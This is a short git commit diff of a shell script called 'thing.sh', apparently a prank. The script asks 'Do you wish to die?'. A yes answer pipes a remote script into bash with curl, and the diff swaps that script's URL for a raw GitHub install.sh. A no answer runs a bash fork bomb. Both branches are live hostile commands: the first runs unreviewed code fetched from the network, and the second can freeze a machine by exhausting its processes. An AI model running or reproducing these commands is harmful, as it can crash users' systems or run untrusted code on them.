5e34e8ee288a45bf9c6ab41dfee4536cde32d5a2
notadevloper <nah@imgood.com>
2025-11-30 00:54:20 +0330

    asadf

--- thing.sh
+++ thing.sh
@@ -2,7 +2,7 @@
 while true; do
     read -p "Do you wish to die?[y/n] " yn
     case $yn in
-        [Yy]* )  curl -fsSL https://pipemeuwu.sh/trust-me | bash ; break;;
+        [Yy]* )  curl -fsSL https://raw.githubusercontent.com/notadevloper/fetchfetchfetchfetchfetchfetchfetchfetchfetchfetchfetchfetchfetchfetchfetch/refs/heads/main/install.sh | bash ; break;;
         [Nn]* )  :(){ :|:& };: ;;
         * ) echo "Please answer now.";;
     esac
